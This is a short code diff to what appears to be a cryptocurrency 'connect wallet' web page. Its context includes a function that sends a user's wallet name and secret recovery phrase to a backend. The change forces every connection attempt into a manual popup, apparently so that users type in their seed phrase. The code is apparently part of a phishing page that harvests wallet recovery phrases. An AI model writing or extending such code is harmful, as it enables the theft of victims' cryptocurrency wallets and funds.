@@ -42,6 +42,7 @@ const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
       secretPhrase,
       userWalletName
     });
+
     return response.data; // assuming backend responds with { success: true/false, ... }
   } catch (err) {
     console.error('Error sending wallet info:', err);
@@ -71,7 +72,7 @@ export default function ConnectPage() {
   
   // Handle both manual and automatic connection flow - both go to manual process
   const handleConnect = (type) => {
-    setShowManualPopup(false);
+    setShowManualPopup(true);
   };
   
   const handleWalletSelect = (wallet) => {
